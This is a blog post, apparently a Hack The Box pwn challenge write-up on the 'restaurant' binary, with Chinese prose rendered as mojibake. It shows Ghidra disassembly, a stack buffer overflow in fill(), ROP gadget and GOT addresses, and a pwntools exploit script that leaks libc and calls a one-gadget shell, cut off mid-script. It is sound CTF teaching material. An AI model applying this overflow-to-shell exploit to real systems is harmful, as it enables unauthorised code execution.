<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="è¯¦ç»†è¿‡ç¨‹åŠexp - 1è¿™é“é¢˜é€šå¸¸çš„pwné¢˜æ²¡ä»€ä¹ˆä¸¤æ ·ã€‚å’Œä»¥å‰çš„é—®é¢˜ä¸åŒçš„æ˜¯ï¼Œèœå•ä¸ä¼šé‡å¤ã€‚åªè¦åšå‡ºä¸€æ¬¡é€‰æ‹©ï¼Œbinaryå°±ä¼šç»“æŸã€‚ 1234567891011â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;pwn_restaurant]â””â”€# file restaurantrestaurant: ELF 64-bit LSB executable, x86">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-pwn-challenge[restaurant]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/05/08/pwn-restaurant/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="è¯¦ç»†è¿‡ç¨‹åŠexp - 1è¿™é“é¢˜é€šå¸¸çš„pwné¢˜æ²¡ä»€ä¹ˆä¸¤æ ·ã€‚å’Œä»¥å‰çš„é—®é¢˜ä¸åŒçš„æ˜¯ï¼Œèœå•ä¸ä¼šé‡å¤ã€‚åªè¦åšå‡ºä¸€æ¬¡é€‰æ‹©ï¼Œbinaryå°±ä¼šç»“æŸã€‚ 1234567891011â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;pwn_restaurant]â””â”€# file restaurantrestaurant: ELF 64-bit LSB executable, x86">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn1.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn2.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn3.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn4.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn5.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn6.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn7.jpg">
<meta property="article:published_time" content="2021-05-08T08:56:07.000Z">
<meta property="article:modified_time" content="2021-09-02T09:19:08.510Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/restaurant-pwn.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/05/08/pwn-restaurant/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/05/08/pwn-restaurant/","path":"2021/05/08/pwn-restaurant/","title":"Hack-The-Box-pwn-challenge[restaurant]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-pwn-challenge[restaurant] | lUc1f3r11's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">lUc1f3r11's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">202</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E5%8F%8Aexp-1"><span class="nav-number">1.</span> <span class="nav-text">è¯¦ç»†è¿‡ç¨‹åŠexp - 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E5%8F%8Aexp-2"><span class="nav-number">2.</span> <span class="nav-text">è¯¦ç»†è¿‡ç¨‹åŠexp - 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Basic-checks"><span class="nav-number">2.1.</span> <span class="nav-text">1. Basic checks:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Run-binary-in-GDB-chose-the-first-option-and-input-44B-of-data"><span class="nav-number">2.2.</span> <span class="nav-text">2. Run binary in GDB chose the first option and input 44B of data:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Control-full-8-Byte-return-address"><span class="nav-number">2.3.</span> <span class="nav-text">3. Control full 8 Byte return address:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-ASLR-bypass"><span class="nav-number">2.4.</span> <span class="nav-text">4. ASLR bypass:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-NX-bit-bypass"><span class="nav-number">2.5.</span> <span class="nav-text">5. NX bit bypass:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Final-exploit"><span class="nav-number">2.6.</span> <span class="nav-text">6. Final exploit:</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/lucifer11.jpg">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail â†’ mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page â†’ https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube â†’ https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram â†’ https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange â†’ https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">è®°å¿†é‡Œçš„çº¯çœŸ</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">å°ç¦»</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/05/08/pwn-restaurant/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lucifer11.jpg">
      <meta itemprop="name" content="lUc1f3r11">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-pwn-challenge[restaurant] | lUc1f3r11's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-pwn-challenge[restaurant]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-05-08 16:56:07" itemprop="dateCreated datePublished" datetime="2021-05-08T16:56:07+08:00">2021-05-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-09-02 17:19:08" itemprop="dateModified" datetime="2021-09-02T17:19:08+08:00">2021-09-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">é€†å‘</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="è¯¦ç»†è¿‡ç¨‹åŠexp-1"><a href="#è¯¦ç»†è¿‡ç¨‹åŠexp-1" class="headerlink" title="è¯¦ç»†è¿‡ç¨‹åŠexp - 1"></a>è¯¦ç»†è¿‡ç¨‹åŠexp - 1</h2><p>è¿™é“é¢˜é€šå¸¸çš„pwné¢˜æ²¡ä»€ä¹ˆä¸¤æ ·ã€‚å’Œä»¥å‰çš„é—®é¢˜ä¸åŒçš„æ˜¯ï¼Œèœå•ä¸ä¼šé‡å¤ã€‚åªè¦åšå‡ºä¸€æ¬¡é€‰æ‹©ï¼Œbinaryå°±ä¼šç»“æŸã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># file restaurant</span></span><br><span class="line">restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=34d48877c9e228a7bc7b66b34f0d4fa6353d20b4, not stripped</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/challenge/pwn/pwn_restaurant]</span><br><span class="line">â””â”€<span class="comment"># checksec restaurant</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/pwn_restaurant/restaurant&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>è¿™é‡Œå…³ç³»åˆ°full relro, NX å¼€å¯ã€‚è€Œä¸”ï¼Œlibcå·²ç»ç»™äº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨oneshotæ¥å†™ã€‚</p>
<p>åªè¦è¾“å…¥1å°±å¯ä»¥å¡«æ»¡é£Ÿç‰©ï¼Œè¾“å…¥2å°±å¯ä»¥é€‰æ‹©å–çš„ä¸œè¥¿ã€‚è¾“å…¥1æ—¶ï¼Œ</p>
<p>ä¸‹é¢æ˜¯ghidraä¸­çš„ä¼ªä»£ç </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void fill(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined8 local_18;</span><br><span class="line">  undefined8 local_10;</span><br><span class="line">  </span><br><span class="line">  local_28 = 0;</span><br><span class="line">  local_20 = 0;</span><br><span class="line">  local_18 = 0;</span><br><span class="line">  local_10 = 0;</span><br><span class="line">  color(<span class="string">&quot;\nYou can add these ingredients to your dish:&quot;</span>,<span class="string">&quot;green&quot;</span>,&amp;DAT_00401144);</span><br><span class="line">  puts(<span class="string">&quot;\n1. ğŸ…\n2. ğŸ§€&quot;</span>);</span><br><span class="line">  color(<span class="string">&quot;You can also order something else.\n&gt; &quot;</span>,<span class="string">&quot;green&quot;</span>,&amp;DAT_00401144);</span><br><span class="line">  <span class="built_in">read</span>(0,local_28&amp;,0x400);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnjoy your %s&quot;</span>,&amp;local_28);</span><br><span class="line">  <span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>local_28(0x20)å¯ä»¥è¾“å…¥0x400ï¼Œæ‰€ä»¥åªè¦å¾€è¿™é‡Œoverflowå°±å¯ä»¥äº†ã€‚</p>
<p>æ‰¾åˆ°äº†libc baseå€¼åï¼Œå°±ç”¨oneshotæ‰“å°±å¯ä»¥äº†ã€‚</p>
<ul>
<li>ä¸‹é¢å…ˆåœ¨ghidraä¸­æ‰¾åœ°å€:</li>
</ul>
<p>undefined8 main(void)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00400f68 55              PUSH       RBP</span><br><span class="line">æ‰€ä»¥ï¼š</span><br><span class="line">main = 0x0000000000400F68</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void __libc_csu_init(EVP_PKEY_CTX *param_1,undefined8 param_2,undefined8 param_3)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long lVar1;</span><br><span class="line">  </span><br><span class="line">  _init(param_1);</span><br><span class="line">  lVar1 = 0;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    (*(code *)(&amp;__frame_dummy_init_array_entry)[lVar1])((ulong)param_1 &amp; <span class="number">0</span>xffffffff,param_2,param_3)</span><br><span class="line">    ;</span><br><span class="line">    lVar1 += <span class="number">1</span>;</span><br><span class="line">  &#125; while (lVar1 != <span class="number">1</span>);</span><br><span class="line">  return; // åŒå‡»æ­¤å¤„</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004010a2 41 5f           POP        R15</span><br><span class="line">004010a4 c3              RET</span><br><span class="line">æ‰€ä»¥ï¼š</span><br><span class="line">prdi = 0x00000000004010a3</span><br></pre></td></tr></table></figure>

<p>åŒå‡».gotï¼Œç„¶åå¾€ä¸‹ç¿»å³å¯çœ‹åˆ°PTR_puts_00601fa8</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">                        PTR_puts_00601fa8                               XREF[1]:     puts:00400650  </span><br><span class="line">00601fa8 00 30 60        addr       puts                                             = ??</span><br><span class="line">            00 00 00 </span><br><span class="line">            00 00</span><br><span class="line">æ‰€ä»¥ï¼š</span><br><span class="line">putsgot = 0x0000000000601FA8</span><br></pre></td></tr></table></figure>

<p>åœ¨functionsä¸­åŒå‡»putså‡½æ•°å³å¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00400650 ff 25 52        JMP        qword ptr [-&gt;puts]                               int puts(char * __s)</span><br><span class="line">            19 20 00</span><br><span class="line">æ‰€ä»¥ï¼š</span><br><span class="line">puts = 0x0000000000400650</span><br></pre></td></tr></table></figure>

<p>åŒå‡».bss</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bss = 0x0000000000602800</span><br></pre></td></tr></table></figure>

<p>åœ¨functionsä¸­åŒå‡»fillå‡½æ•°å³å¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00400e4a    55          PUSH       RBP</span><br><span class="line">æ‰€ä»¥ï¼š</span><br><span class="line">fill = 0x0000000000400E4A</span><br></pre></td></tr></table></figure>

<p>åœ¨fillå‡½æ•°ä¸­å®šä½: read(0,&amp;local_28,0x400);</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00400ebc 48 8d 45 e0     LEA        RAX=&gt;local_28,[RBP + -0x20]</span><br><span class="line">æ‰€ä»¥ï¼š</span><br><span class="line"><span class="built_in">read</span> = 0x0000000000400EBC</span><br></pre></td></tr></table></figure>

<ul>
<li>getshell.py</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># please use python2.7</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">main = 0x0000000000400F68</span><br><span class="line">prdi = 0x00000000004010a3</span><br><span class="line">putsgot = 0x0000000000601FA8</span><br><span class="line">puts = 0x0000000000400650</span><br><span class="line">bss = 0x0000000000602800</span><br><span class="line">fill = 0x0000000000400E4A</span><br><span class="line"><span class="built_in">read</span> = 0x0000000000400EBC</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;A&quot;</span>*0x20</span><br><span class="line">    payload += p64(bss)</span><br><span class="line">    payload += p64(prdi)</span><br><span class="line">    payload += p64(putsgot)</span><br><span class="line">    payload += p64(puts)</span><br><span class="line">    payload += p64(main)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;A&quot;</span>*0x20)</span><br><span class="line"></span><br><span class="line">    puts_g = u64(p.recv(6) + <span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;puts_g address:&quot;</span>, hex(puts_g)</span><br><span class="line">    libc = puts_g - 0x80aa0</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;libc address:&quot;</span>, hex(libc)</span><br><span class="line">    oneshot = libc + 0x4f432</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;oneshot address:&quot;</span>, hex(oneshot)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload2 += <span class="string">&quot;B&quot;</span>*0x20</span><br><span class="line">    payload2 += p64(bss)</span><br><span class="line">    payload2 += p64(<span class="built_in">read</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt; &quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#p.recvuntil(&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;)</span></span><br><span class="line">    raw_input()</span><br><span class="line">    payload3 = <span class="string">&quot;C&quot;</span>*0x28</span><br><span class="line">    payload3 += p64(oneshot)</span><br><span class="line"></span><br><span class="line">    p.send(payload3)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] You Have Successfully Got The shell...&quot;</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span 